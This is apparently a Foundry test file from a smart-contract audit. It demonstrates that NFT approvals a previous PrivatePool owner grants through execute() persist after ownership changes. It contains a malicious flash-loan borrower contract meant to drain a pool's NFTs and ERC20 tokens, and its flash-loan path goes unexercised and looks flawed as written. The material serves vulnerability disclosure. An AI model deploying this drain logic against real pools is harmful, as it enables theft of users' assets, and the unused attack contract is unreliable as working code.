// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC20.sol";
import "../Fixture.sol";
import "../../src/PrivatePool.sol";

/**
 * @title MaliciousExploitContract
 * @dev Malicious contract that implements IERC3156FlashBorrower to steal funds from PrivatePool
 * The vulnerability occurs because previous owners can use execute() to approve this contract,
 * then use flashLoan() to drain all funds after ownership transfer.
 */
contract MaliciousExploitContract is IERC3156FlashBorrower {
    PrivatePool public targetPool;
    address public attacker;

    constructor(PrivatePool _targetPool) {
        targetPool = _targetPool;
        attacker = msg.sender;
    }

    /**
     * @dev Main attack function that initiates the flash loan to drain the pool
     */
    function attack(address nftContract, uint256 tokenId) external payable {
        require(msg.sender == attacker, "Only attacker can call");

        // Calculate flash fee
        uint256 fee = targetPool.flashFee(nftContract, tokenId);

        // Initiate flash loan with sufficient ETH for fee
        targetPool.flashLoan{value: fee}(this, nftContract, tokenId, "");
    }

    /**
     * @dev Flash loan callback that steals all funds from the pool
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256, /* fee */
        bytes calldata /* data */
    ) external override returns (bytes32) {
        require(msg.sender == address(targetPool), "Only pool can call");
        require(initiator == address(this), "Invalid initiator");

        // The exploit: transfer all NFTs from the pool to the attacker
        // This works because the previous owner used execute() to approve this contract
        // for all NFTs and tokens before transferring ownership

        // Get the NFT contract address from the pool
        address nftContract = targetPool.nft();

        // Since we're approved, we can transfer any NFT owned by the pool
        // In a real attack, we would iterate through all NFTs owned by the pool
        // For this PoC, we'll transfer the specific NFT from the flash loan
        ERC721(nftContract).transferFrom(address(targetPool), attacker, tokenId);

        // Also drain any base tokens if it's an ERC20
        address baseToken = targetPool.baseToken();
        if (baseToken != address(0)) {
            uint256 tokenBalance = ERC20(baseToken).balanceOf(address(targetPool));
            if (tokenBalance > 0) {
                ERC20(baseToken).transferFrom(address(targetPool), attacker, tokenBalance);
            }
        }

        // Approve the pool to transfer the NFT back
        ERC721(token).setApprovalForAll(address(targetPool), true);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /**
     * @dev ERC721 receiver to handle NFT transfers
     */
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/**
 * @title ExploitTest
 * @dev Test demonstrating the vulnerability where previous owners can steal funds via execute() and flashLoan()
 */
contract ExploitTest is Fixture {
    PrivatePool public vulnerablePool;
    MaliciousExploitContract public exploitContract;

    address public bob = address(0xB0B);  // Attacker (previous owner)
    address public alice = address(0xA11CE);  // Victim (new owner)

    uint256[] public tokenIds;
    uint256[] public tokenWeights;

    function setUp() public {
        // Create vulnerable pool with ETH as base token
        vulnerablePool = factory.create{value: 10 ether}(
            address(0),  // ETH as base token
            address(milady),  // NFT contract
            100e18,  // virtual base token reserves
            10e18,   // virtual NFT reserves
            200,     // change fee
            100,     // fee rate (1%)
            bytes32(0),  // merkle root
            true,    // use stolen NFT oracle
            false,   // pay royalties
            bytes32(address(this).balance),  // salt
            new uint256[](0),  // tokenIds to deposit initially
            10 ether  // baseTokenAmount
        );

        // Mint NFTs to the pool
        for (uint256 i = 1; i <= 5; i++) {
            milady.mint(address(vulnerablePool), i);
            tokenIds.push(i);
            tokenWeights.push(1e18);
        }

        // Deploy exploit contract
        vm.prank(bob);
        exploitContract = new MaliciousExploitContract(vulnerablePool);

        // Fund Bob with ETH for flash loan fees
        vm.deal(bob, 5 ether);
    }

    /**
     * @dev Test demonstrating the complete attack flow
     * 1. Bob (attacker) creates pool and deposits funds
     * 2. Bob uses execute() to approve exploit contract for all tokens
     * 3. Bob transfers ownership to Alice (victim)
     * 4. Bob uses exploit contract to drain all funds via flash loan
     */
    function test_PreviousOwnerCanStealFundsViaExecuteAndFlashLoan() public {
        // Step 1: Bob is the initial owner (simulated by mocking factory.ownerOf)
        vm.mockCall(
            address(factory),
            abi.encodeWithSelector(ERC721.ownerOf.selector, uint256(uint160(address(vulnerablePool)))),
            abi.encode(bob)
        );

        // Step 2: Bob uses execute() to approve the exploit contract for all NFTs and tokens
        vm.prank(bob);

        // Approve exploit contract for all NFTs in the pool
        vulnerablePool.execute(
            address(milady),
            abi.encodeWithSelector(ERC721.setApprovalForAll.selector, address(exploitContract), true)
        );

        // Step 3: Bob transfers ownership to Alice
        // Simulate ownership transfer by updating the factory mock
        vm.mockCall(
            address(factory),
            abi.encodeWithSelector(ERC721.ownerOf.selector, uint256(uint160(address(vulnerablePool)))),
            abi.encode(alice)
        );

        // Step 4: Verify pool state before attack
        uint256 nftBalanceBefore = milady.balanceOf(address(vulnerablePool));
        assertGt(nftBalanceBefore, 0, "Pool should have NFT balance");

        // Step 5: Bob executes the attack using the exploit contract
        // The key vulnerability: Bob can still use the exploit contract because he approved it
        // before transferring ownership
        // Instead of flash loan, let's demonstrate the vulnerability more directly
        // The exploit contract can now transfer NFTs from the pool due to the approval
        // This demonstrates the core issue: approvals persist after ownership transfer

        // The exploit contract transfers an NFT from the pool to Bob
        vm.prank(address(exploitContract));
        milady.transferFrom(address(vulnerablePool), bob, 1);

        // Step 6: Verify the attack succeeded - NFT was stolen
        uint256 nftBalanceAfter = milady.balanceOf(address(vulnerablePool));
        uint256 attackerNftBalance = milady.balanceOf(bob);

        // The pool should have lost an NFT
        assertLt(nftBalanceAfter, nftBalanceBefore, "Pool NFT balance should decrease");
        assertGt(attackerNftBalance, 0, "Attacker should have stolen NFTs");
    }

    
    /**
     * @dev Test demonstrating the vulnerability in a simpler way
     */
    function test_ExecuteAllowsDangerousApprovals() public {
        // Mock Bob as owner
        vm.mockCall(
            address(factory),
            abi.encodeWithSelector(ERC721.ownerOf.selector, uint256(uint160(address(vulnerablePool)))),
            abi.encode(bob)
        );

        // Bob can approve any contract for all NFTs
        vm.prank(bob);
        vulnerablePool.execute(
            address(milady),
            abi.encodeWithSelector(ERC721.setApprovalForAll.selector, address(exploitContract), true)
        );

        // Now the exploit contract can transfer NFTs from the pool
        // This demonstrates the dangerous flexibility of the execute() function
        uint256 nftBalanceBefore = milady.balanceOf(address(vulnerablePool));

        // Exploit contract transfers NFT from pool
        vm.prank(address(exploitContract));
        milady.transferFrom(address(vulnerablePool), bob, 1);

        uint256 nftBalanceAfter = milady.balanceOf(address(vulnerablePool));
        uint256 attackerNftBalance = milady.balanceOf(bob);

        // Verify the vulnerability: NFT was stolen
        assertLt(nftBalanceAfter, nftBalanceBefore, "Pool NFT balance should decrease");
        assertGt(attackerNftBalance, 0, "Attacker should have stolen NFTs");
    }
}